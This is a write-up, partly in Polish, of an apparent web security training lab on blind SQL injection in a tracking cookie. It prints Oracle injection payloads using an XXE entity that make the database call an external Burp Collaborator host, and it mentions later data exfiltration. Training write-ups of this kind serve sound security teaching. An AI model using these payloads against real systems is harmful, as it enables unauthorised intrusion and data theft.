This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.



1. wejdź w zadanie, uruchom burpa, włącz intercepta, na stronie kliknij w home, przechwycone połączenie wyślij do repetera, wyłącz intercepta
2. Niestety, w podstawowej wersji burpa nie można korzystac z burp collaborator, tak więc w tym zadaniu tylko opisze jak je można zrobić,gdyż sam go nie mogłem wykonać
3. Wchodzimy w buripie w burp colaborator client klikamy copy to clickboard wklejamy sobie w notatniku link, który wygląda mniejwięcej tak fdsajuidha11d1ce1c1sd23cc51dcasd1dqe2e1.burpcollaborator.net
4. Wracamy do repetera,wchodzimy w cheat sheet i patrzymy DNS lookup: wpisujemy DNS po kolei, Oracle, Microsoft, PostreSQL i MySQL i patzymy który przechodzi. W zadaniu jest to SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
5. Modyfikujemy tą linijkę o SQL i lini i wychodzi na koniec tak:' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://fdsajuidha11d1ce1c1sd23cc51dcasd1dqe2e1.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--(pamiętajmy od tym aby zrobić z tego encoded, więc ctrl+u)
6. klikamy send. przechodzimy do burp colaborator client i klikamy pull now


1.Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.

2.Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

3.Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.
The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.